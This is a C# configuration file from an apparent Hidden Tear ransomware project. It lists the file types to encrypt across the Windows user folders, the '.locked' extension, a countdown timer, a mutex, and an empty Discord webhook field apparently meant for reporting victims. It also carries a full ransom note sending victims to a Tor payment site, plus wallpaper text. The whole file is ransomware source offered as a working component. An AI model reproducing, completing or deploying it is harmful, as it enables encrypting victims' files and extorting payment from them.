using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace hidden_tear.Tools
{
    internal class Config
    {
        public static string[] extensionToEncrypt = new string[] { ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd", ".pdf", ".sqlite3", ".db" };
        public static string DiscordWebhook = "";
        public static string encryptedExtension = ".locked";
        public static string userName = Environment.UserName;
        public static string computerName = System.Environment.MachineName.ToString();
        public static string userDir = "C:\\Users\\";
        public static string mutex = "dsdoskdosk837928hduijfh";
        public static int day = 10;
        public static int hour = 60;
        public static int minute = 60;
        public static int second = 60;


        public static string note = "IMPORTANT INFORMATION\r\n\r\nYour network has been infected and compromised by Hidden Tear Ransomware.\r\n\r\nAll your important files have been encrypted and you are not able to access them.\r\n\r\nTo restore access to your files, you must follow these steps:\r\n\r\nDownload and install Tor browser from torproject.org\r\nOpen Tor browser and visit our decryption service: youronionaddress.onion\r\nFollow the instructions on the decryption service page to get your personal decryption key and instructions.\r\nWarning!\r\n\r\nDo not attempt to restore your files using third-party software, as it may cause permanent data loss.\r\n\r\nDo not modify or rename encrypted files, as it will make decryption impossible.\r\n\r\nDo not share your personal decryption key with anyone.\r\n\r\nIf you have any questions, you can contact our support team at support@contiransomware.com";

        public static string[] WALLPAPER =
        {
            "Hidden Tear Ransomware",
            "Your files have been infected and stolen",
            "Follow the instructions"
        };
    }
}